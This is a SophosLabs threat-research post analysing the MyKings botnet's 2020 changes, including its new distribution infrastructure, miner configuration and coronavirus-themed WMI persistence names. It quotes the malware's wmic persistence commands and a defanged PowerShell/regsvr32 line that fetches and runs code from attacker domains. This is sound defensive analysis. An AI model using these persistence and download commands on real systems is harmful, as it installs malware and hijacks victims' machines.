@@ -1,0 +1,89 @@
+Mykings jumps on the Corona train
+
+The ubiquitous, noisy, SQL-attacking botnet can't help comparing itself to a deadly disease
+
+Written by
+Gabor Szappanos
+
+July 02, 2020
+
+SophosLabs Uncut Botnet coronav coronav2 cryptominer EternalBlue MyKings
+
+A lot of cybercriminal groups adopt themes drawn from current events to attract victims, and there’s no bigger global news story right now than the ongoing fight against the novel coronavirus or the disease it causes, COVID-19. While most attackers who reference ripped-from-the-headlines topics tend to use those lures in malicious emails or text messages, the operators of the MyKings botnet doesn’t use those types of methods to spread infections — they prefer cracking SQL servers or using the EternalBlue exploit to infect computers.
+Mykings have taken a slightly different approach: They added references to our global pandemic into the source code of their malware, itself.
+But that’s not the only news about this group, which we’ve covered in previous SophosLabs uncut posts. The botnet’s operators made significant changes to their infrastructure, moving almost all of the domains they use to distribute the malware (including a few new ones) so it is hosted on a single IP address. They’ve also enhanced the update mechanism with a twist, rolling into production a previously-developed but unused feature to update the C2 servers used by the bootkit components.
+New domains
+We noticed a new ftp drop site used by the botnet, residing on the IP address 185.26.112.217. As it turned out this server is also used to distribute some of the updated components:
+
+The 400kB files are WinRAR SFX droppers for the c3.bat installer; the 40kB files are NSIS Dloadr packages, both detailed in our previously-released MyKings report.
+Beyond the file repository, Virustotal passive DNS info revealed that many of the historically used distribution domains (and some we didn’t previously know about) were also migrated to this new host.
+Revitalized update mechanism
+One of the major components of the botnet is the WinRAR SFX (self extracting executable) that drops the main installer script, c3.bat. The latest updates to the botnet added a twist to this scheme, with an additional layer of packaging.
+This component now is a WinRAR SFX dropper that drops another WinRAR SFX package. The top level dropper updates the bootkit configuration, while the internal layer contains config update for the cryptominer component.
+These files make up the contents of the top level archive:
+
+d5e25a7fbeb1b710accd7056c3439f0743288792  ntuser.dat
+7eba46568f20987d644d334bea1fd40fd4d68ccb  upx.exe
+The ntuser.dat file contains an encrypted configuration, and the shellcode, used by the bootkit component. It expects itself to be in the Windows\Temp directory, which is exactly where the installer unpacks it.
+The config file is encoded with a single-byte XOR. In its encrypted form, it looks like this:
+Config file content encoded with a one-byte XOR (the key is 0x95).
+The decryped content reveals the updated download server list:
+[main]
+count=6
+ip1=http://gamesoxalic.com
+ip2=http://catsmeowalot.com
+ip3=http://b5w91.com
+[update]
+count=6
+ip1=http://gamesoxalic.com
+ip2=http://catsmeowalot.com
+ip3=http://b5w91.com
+The second file in the package, named upx.exe, is a WinRAR SFX dropper that contains c3.bat, the main installer component of the botnet.
+This archive contains the following:
+
+The c3.bat and n.vbs files serve the same purpose as the files by the same name we analyzed previously: n.vbs starts c3.bat which is the main installer component of the botnet.
+There is an additional file to the usual content, named excludes, which contains the configuration data for the XMRig cryptocurrency miner, including the following wallet info:
+"url": "xmr-eu1.nanopool.org:14433",
+"user": "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQtLomg2VJLC55d2Npc.x",
+"url": "xmr-eu1.nanopool.org:14444",
+"user": "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQtLomg2VJLC55d2Npc.x2",
+This mechanism relies on the fact that some versions of the XMRig miner used by the Mykings botnet search for this “excludes” file in the %TEMP% directory (exactly where the WinRAR SFX extracts it to), and if found, uses this file as the config data.
+
+The botnet operators try to establish a mechanism to easily update the wallet info, without replacing the miner executable itself.
+EternalBlue revisited
+Slight changes were made to the EternalBlue module that MyKings uses. During exploitation, the bot executes a payload script (ms17010_cmd). This usually is a downloader script, which was significantly simplified.
+
+Another notable change is that, instead of hosting it on their own servers (of which they had a lot), the botnet operators now use a script hosted on the website img.vim-cn.com, a little-known, anonymous image hosting service. Needless to say, the criminals were not storing an image file there. Rather, they hosted the downloader component for the botnet that pulls down the next stages.
+
+The Coronavirus connection
+A closer look at the latest c3.bat file revealed that it uses references to the Corona virus in the WMI event handler names:
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="coronav", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 10800 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="coronav2", CommandLineTemplate="cmd /c powershell.exe IEX (New-Object system.Net.WebClient).DownloadString
+…
+cmd /c start wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"coronav\"", Consumer="CommandLineEventConsumer.Name=\"coronav2\""
+This reference to the virus is not normally visible on infected systems and has no effect in increasing the efficiency of the botnet.
+On an infected system the created filter binding can be observed:
+Consumer="CommandLineEventConsumer.Name="coronav2""
+CreatorSID={1,5,0,0,0,0,0,5,21,0,0,0,96,114,232,122,207,62,119,185,146,182,239,211,233,3,0,0}
+DeliverSynchronously=FALSE
+DeliveryQoS=
+Filter="__EventFilter.Name="coronav""
+MaintainSecurityContext=FALSE
+SlowDownProviders=FALSE
+And the event consumer code contains the familiar PowerShell downloader, using the SquiblyDoo technique, with the new download domain names (obfuscated here to prevent accidental clicks):
+CommandLineTemplate=cmd /c powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('hxxp://ruisgood[.]ru/power.txt')||powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('hxxp://gamesoxalic[.]com/power.txt')||regsvr32 /u /s /i:hxxp://ruisgood[.]ru/s.txt scrobj.dll&amp;regsvr32 /u /s /i:hxxp://gamesoxalic[.]com/s.txt scrobj.dll&amp;wmic os get /FORMAT:"hxxp://ruisgood[.]ru/s.xsl"
+Infection stats
+The number of unique bots infected by Mykings at a given time is around 40000, which is about the same number that we observed in the autumn of 2019. Overall, the total number of infected systems this year is over 175,000, and it showed a growing trend, then a yet-unexplained drop in May.
+The targeted countries show a huge change from last year. Last fall, China and Taiwan were the most infected countries. Now the major targets became overwhelmingly countries form the former Soviet Union, with Russia, Ukraine, Kazakhstan, Armenia in the top ten.
+
+Looking at the history of infection, we observe that there were hardly any infected bots reported form China in the months of January and February, then the Chinese infection numbers started to increase in March, and by May the country regained its original position in the top three infected countries. We have no explanation for this significant regional drop.
+Detections
+The MyKings botnet components may be detected by Sophos endpoint security products as Troj/Agent-BAKV, Troj/Agent-BAWU, Troj/DwnLdr-XOD, Troj/DwnLdr-XHH, Troj/Miner-WR, Mal/Miner-C, VBS/Dwnldr-MDQ, or XMRig Miner (PUA).
+Updated indicators of compromise can be found on the SophosLabs Github.
+
+Share on Facebook
+
+Share on Twitter
+
+Share on LinkedIn
